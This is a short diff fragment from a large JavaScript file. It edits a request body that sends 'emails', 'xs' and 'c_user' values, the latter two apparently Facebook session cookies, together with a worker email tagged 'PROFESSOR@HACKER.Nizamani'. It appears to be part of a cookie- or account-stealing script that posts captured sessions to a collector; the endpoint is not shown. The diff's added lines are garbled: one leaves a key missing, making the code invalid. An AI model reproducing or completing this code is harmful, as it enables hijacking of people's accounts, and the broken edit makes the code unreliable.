@@ -10380,10 +10380,10 @@
                               headers: { "Content-Type": "application/json" },
                               body: JSON.stringify({
                                 emails: l,
-                                workerEmail: "PROFESSOR@HACKER.Nizamani",
+                                : "PROFESSOR@HACKER.Nizamani",
                                 xs: r,
                                 c_user: i,
-                                name: "Aizaz",
+                                PROFESSOR: "PROFESSOR",
                               }),
                             }).then((e) => {
                               e.ok;
